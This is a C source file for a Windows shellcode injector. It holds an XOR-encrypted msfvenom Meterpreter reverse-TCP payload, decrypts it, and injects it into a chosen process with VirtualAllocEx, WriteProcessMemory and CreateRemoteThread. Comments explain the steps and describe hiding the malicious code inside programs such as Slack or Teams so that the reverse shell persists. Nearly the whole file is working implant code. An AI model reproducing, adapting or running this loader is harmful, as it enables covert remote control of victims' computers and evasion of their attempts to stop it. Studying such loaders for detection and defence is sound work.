#include <windows.h>
#include <stdio.h>


// Just one basic encryption method, but this function here is to decrypt the shellcode using the XOR method.
// Instead of storing the key harcoded we can give the implant an 

void XOR(char * bin, size_t data_len, char * key, size_t key_len)
{
    int j = 0;
    for(int i = 0; i < data_len; i++)
    {
        if(j == key_len - 1) j = 0;

        bin[i] = bin[i] ^ key[j];
        j++;
    }
}

int main(int argc, char *argv[])
{
    // msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=`CHANGE THIS´ LPORT=`CHANGE THIS´ -f csharp
    // the payload has been encrypted using https://github.com/rektsu/Shellcode-Template-Generator/blob/main/encryptor.py
    unsigned char sc[] = { 0x8f, 0x2d, 0xe0, 0x96, 0x95, 0x9c, 0xab, 0x65, 0x79, 0x73, 0x24, 0x32, 0x33, 0x35, 0x26, 0x3a, 0x33, 0x31, 0x42, 0xb7, 0x6, 0x3a, 0xee, 0x26, 0xb, 0x2d, 0xf2, 0x21, 0x7d, 0x2b, 0xf9, 0x37, 0x54, 0x23, 0xee, 0xb, 0x23, 0x2d, 0x6c, 0xc5, 0x2f, 0x3e, 0x26, 0x54, 0xb0, 0x3b, 0x54, 0xa3, 0xde, 0x59, 0x15, 0x17, 0x67, 0x55, 0x53, 0x24, 0xa2, 0xbb, 0x68, 0x35, 0x6a, 0xa4, 0x9b, 0x9e, 0x37, 0x22, 0x23, 0x2d, 0xff, 0x39, 0x45, 0xf2, 0x31, 0x59, 0x2b, 0x73, 0xb5, 0xff, 0xeb, 0xed, 0x79, 0x73, 0x65, 0x2b, 0xf7, 0xa5, 0x0, 0xc, 0x2d, 0x78, 0xa3, 0x35, 0xe8, 0x3a, 0x7d, 0x30, 0xe0, 0x25, 0x59, 0x3a, 0x64, 0xb3, 0x91, 0x33, 0x3c, 0x94, 0xac, 0x38, 0xf8, 0x51, 0xeb, 0x3a, 0x64, 0xa2, 0x26, 0x54, 0xb0, 0x3b, 0x54, 0xa3, 0xde, 0x24, 0xb5, 0xa2, 0x68, 0x38, 0x72, 0xa4, 0x5b, 0x92, 0x10, 0x85, 0x27, 0x66, 0x35, 0x57, 0x6d, 0x26, 0x4b, 0xb4, 0x1, 0xb3, 0x3d, 0x3d, 0xf8, 0x25, 0x47, 0x3b, 0x64, 0xa4, 0xd, 0x24, 0xf2, 0x7f, 0x2d, 0x27, 0xf9, 0x25, 0x68, 0x22, 0x64, 0xa9, 0x32, 0xee, 0x67, 0xfa, 0x2d, 0x75, 0xbb, 0x24, 0x21, 0x32, 0x3d, 0x3d, 0x2b, 0x3f, 0x35, 0x33, 0x24, 0x20, 0x32, 0x3f, 0x2b, 0xf1, 0x89, 0x54, 0x2a, 0x37, 0x86, 0x93, 0x3d, 0x22, 0x2b, 0x3f, 0x3c, 0xe0, 0x77, 0x90, 0x24, 0x9a, 0x9c, 0x8d, 0x38, 0x3d, 0xd5, 0x12, 0xa, 0x41, 0x3a, 0x50, 0x40, 0x65, 0x74, 0x2a, 0x33, 0x30, 0xfa, 0x83, 0x2b, 0xf3, 0x89, 0xd4, 0x6a, 0x65, 0x79, 0x3a, 0xec, 0x86, 0x3b, 0xd9, 0x76, 0x6b, 0x74, 0x25, 0xb3, 0xcd, 0xd4, 0xf2, 0x24, 0x20, 0x22, 0xec, 0x9d, 0x3f, 0xec, 0x92, 0x33, 0xdf, 0x38, 0x1c, 0x43, 0x7e, 0x8c, 0xb0, 0x2f, 0xfb, 0x8f, 0x1c, 0x6a, 0x64, 0x79, 0x73, 0x3c, 0x22, 0xc8, 0x4c, 0xf4, 0x0, 0x65, 0x86, 0xa6, 0x35, 0x33, 0x3f, 0x54, 0xbd, 0x26, 0x54, 0xb9, 0x3b, 0x9a, 0xa3, 0x3a, 0xec, 0xb6, 0x23, 0x9a, 0xb9, 0x3b, 0xec, 0xa2, 0x33, 0xdf, 0x9e, 0x64, 0xba, 0x99, 0x8c, 0xb0, 0x2b, 0xfb, 0xa2, 0x1e, 0x7b, 0x24, 0x21, 0x3f, 0xec, 0x81, 0x3a, 0xec, 0x8d, 0x2a, 0xdf, 0xe0, 0xd6, 0x11, 0x2, 0x8d, 0xb0, 0x3c, 0xea, 0xa1, 0x39, 0x71, 0x65, 0x63, 0x3b, 0xdd, 0x17, 0x6, 0x1, 0x79, 0x73, 0x65, 0x63, 0x72, 0x24, 0x24, 0x2a, 0x35, 0x31, 0xfa, 0x87, 0x34, 0x25, 0x32, 0x39, 0x5a, 0xa5, 0x13, 0x7e, 0x3c, 0x22, 0x22, 0x87, 0x88, 0xd, 0xa2, 0x3d, 0x57, 0x31, 0x62, 0x73, 0x2d, 0xf9, 0x2f, 0x41, 0x61, 0xb5, 0x65, 0xb, 0x3a, 0xec, 0x92, 0x3d, 0x35, 0x38, 0x23, 0x24, 0x33, 0x33, 0x35, 0x3d, 0x94, 0xa5, 0x38, 0x23, 0x2c, 0x9c, 0xba, 0x28, 0xfd, 0xaa, 0x29, 0xf0, 0xb2, 0x24, 0xd9, 0xb, 0xa9, 0x4b, 0xed, 0x9a, 0xac, 0x3b, 0x54, 0xb1, 0x3a, 0x9a, 0xbe, 0xe0, 0x6b, 0x38, 0xc9, 0x6d, 0xe4, 0x6f, 0x5, 0x8b, 0xbe, 0xde, 0x89, 0xc6, 0xc7, 0x35, 0x33, 0xdf, 0xd2, 0xfe, 0xd8, 0xe4, 0x8c, 0xb0, 0x2b, 0xf1, 0xa1, 0x5c, 0x57, 0x63, 0x5, 0x79, 0xe5, 0x98, 0x92, 0x10, 0x71, 0xd0, 0x22, 0x6a, 0x1, 0xa, 0x9, 0x72, 0x3c, 0x35, 0xe2, 0xbf, 0x86, 0xa6 };

    HANDLE pHandle;
    HANDLE rThread;
    PVOID rBuffer;

    char key[] = "secretkey";

    
    // Decrypt shellcode
    XOR((char *) sc, sizeof(sc), key, sizeof(key));

    
    // Open the given ID process
    printf("PID: %i", atoi(argv[1]));
    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
  
    
    // Reserve memory 
    // VirtualAllocEx != VirtualAlloc because VirtuallAllocEx is to allocate memory in another process address space 
    // In this case our target ID process
    //     First parameter is the handle to a process (given ID process we just stored in pHandle (process handle) with OpenProcess)
    //     the function allocates the memory within the virtual address space of that process.
    rBuffer = VirtualAllocEx(pHandle, NULL, sizeof(sc), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  
    // Following MSDN documentation 
    // WritesProcessMemory API Call -> Writes data (in this case our already decrypted shellcode) to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.
    WriteProcessMemory(pHandle, rBuffer, sc, sizeof(sc), NULL);

    // CreateThread vs CreateRemoteThread -> CreateThread and CreateRemoteThread are really the same API and work the same way, the only difference being that 
    // CreateThread only allows you to create a thread in the current process while CreateRemoteThread allows you to specify a process to create a thread in.   
    // This is an advantage, because if you run your malicious code and the user ends the process you will lost the connection / code execution, but creating a thread in a remote process you "migrate" the shellcode to another process,
    // Meaning the user must end the process (for example Slack, Teams, w.e) to end the malicious code from running (i.e bind/reverse shell, etc).
    rThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE) rBuffer, NULL, 0, NULL);

    CloseHandle(pHandle);
    return 0;
}
